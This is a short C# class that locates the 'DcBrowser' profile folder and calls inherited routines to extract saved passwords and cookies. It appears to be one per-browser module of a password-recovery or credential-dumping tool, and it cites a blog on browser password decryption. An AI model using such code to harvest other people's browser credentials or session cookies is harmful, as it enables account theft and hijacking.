using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace dao
{
    /// <summary>
    /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
    /// </summary>
    class ChromeDC : BaseChrome, IReader
    {
        public string BrowserName { get { return "DcBrowser"; } }

        public IEnumerable<PassModel> Passwords()
        {
            String LOCAL_PATH = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            return base.Reads(Path.Combine(LOCAL_PATH, @"DcBrowser\User Data"));
        }

        public IEnumerable<Cookie> Cookies(String host = null)
        {
            String LOCAL_PATH = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            return base.ReadsCookie(Path.Combine(LOCAL_PATH, @"DcBrowser\User Data"), host);
        }
    }



}
